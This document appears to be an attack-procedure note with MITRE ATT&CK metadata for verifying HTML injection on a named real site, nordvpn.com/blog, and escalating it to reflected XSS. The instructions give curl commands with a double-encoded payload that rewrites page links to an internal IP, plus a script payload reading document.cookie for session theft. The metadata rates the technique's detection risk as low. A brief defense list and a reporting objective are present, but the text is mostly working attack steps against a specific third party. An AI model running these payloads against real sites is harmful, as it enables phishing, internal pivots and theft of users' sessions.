---
tags:
  - html-injection
  - xss
  - verification
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-fetch-vulnerable-url]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: a4113b6f-ce8d-4b0b-bf18-d26cb5b0df7a
created_at: '2025-12-14T03:47:18.161Z'
updated_at: '2025-12-14T03:47:18.161Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-HTML-Injection-on-Page

## Summary

This procedure verifies the success of HTML injection by inspecting the rendered blog page for injected elements, such as links to arbitrary domains, and tests for potential XSS by attempting JavaScript payloads.

## Description

After injecting HTML via the URL parameter, the nordvpn.com/blog page reflects the payload, often at the bottom, altering links to point to attacker-controlled domains. This can lead to phishing or internal pivots. If Cloudflare's filters are bypassed, escalating to reflected XSS allows JavaScript execution for stealing session cookies (e.g., via `document.cookie`). The procedure uses browser inspection or curl to confirm, assuming the initial injection succeeded. Expected outcomes include visible redirects and, if XSS works, executable scripts.

## Requirements

1. Successful Step 1 from crafting procedure
2. Browser dev tools or curl for inspection
3. Knowledge of HTML/JS for payload testing

## Defense

Defensive measures and detection strategies:

- Enforce output encoding (e.g., HTML entity encoding) on reflected parameters.
- Implement strict CSP headers to prevent script execution.
- Log and alert on pages with unexpected HTML tags or JS in query params.
- Regular vulnerability scanning with tools like OWASP ZAP for injection flaws.

## Objectives

1. Confirm injection by observing altered page elements.
2. Test for XSS to evaluate session theft risk.
3. Document evidence for vulnerability reporting.

## Instructions

### Step 1: Load and Inspect the Page

**Context**: Access the injected URL and check for reflected HTML, focusing on link hrefs at the page bottom.

**Command** ([[commands/curl-fetch-vulnerable-url]]):
```bash
curl -s "https://nordvpn.com/blog/?1%25%32%25%32%25%33%65%25%33%63%25%32%66%25%36%31%25%13%25%33%63%25%36%31%25%30%63href%25%33%64%25%32%32http://3232235777" | grep -i "192.168.1.1"
```

> In a browser, load the URL and use dev tools (F12) to search for the injected href. Success shows links pointing to 192.168.1.1.

### Step 2: Test for XSS Escalation

**Context**: Modify the payload to include JS and check if it executes, indicating bypassable filters for cookie theft.

**Command** ([[commands/curl-fetch-vulnerable-url]]):
```bash
curl -s "https://nordvpn.com/blog/?[encoded-js-payload-like-%3Cscript%3Ealert(document.cookie)%3C/script%3E]" | grep -i "script"
```

> Craft encoded `<script>alert(document.cookie)</script>`, load in browser. If alert shows cookies, XSS is confirmed; otherwise, HTML injection only.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-fetch-vulnerable-url]]

## Tools Used

- None

## Tags

- [[html-injection]]
- [[xss]]
- [[verification]]
